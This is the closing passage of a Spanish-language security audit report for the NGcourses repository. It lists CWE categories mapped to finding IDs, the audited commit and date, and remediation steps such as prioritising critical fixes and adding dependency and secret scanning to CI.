| CWE-646 | Reliance on File Name/Extension | FND-013 |
| CWE-693 | Protection Mechanism Failure | FND-008 |
| CWE-754 | Improper Check for Exceptional Conditions | FND-019 |
| CWE-778 | Insufficient Logging | FND-025 |
| CWE-798 | Use of Hard-coded Credentials | FND-006 |
| CWE-915 | Improperly Controlled Modification of Object Attributes | FND-001 |
| CWE-922 | Insecure Storage of Sensitive Info | FND-003 |
| CWE-942 | Permissive Cross-domain Policy | FND-012 |
| CWE-1004 | Sensitive Cookie Without HttpOnly | FND-003 |
| CWE-1021 | Improper Restriction of Rendered UI Layers | FND-008 |

### 7.3 Versiones auditadas

- **Repo:** `c:\Users\admin\Documents\GitHub\NGcourses`
- **Branch:** `main`
- **HEAD:** `3d1818e` (al momento de la auditoría)
- **Fecha de la auditoría:** 2026-05-09
- **Archivos clave revisados:** ver Sección 2.

### 7.4 Próximos pasos sugeridos

1. Crear issues en GitHub uno por hallazgo crítico/alto, etiquetados `security` y priorizados.
2. Asignar P0 (FND-001 a FND-008, FND-016) al sprint en curso.
3. Bloquear merge a `main` hasta que P0 estén resueltos (rama `security/p0-fixes`).
4. Re-auditoría posterior a los fixes (idealmente externa, e.g. `/ultrareview` o pentest manual).
5. Configurar CI dependency scanning (`pip-audit`, `npm audit`) y gitleaks como puerta obligatoria de PR.
6. Documentar este informe en `docs/` y referenciarlo desde `README.md` para visibilidad del equipo.

---

*Fin del informe.*
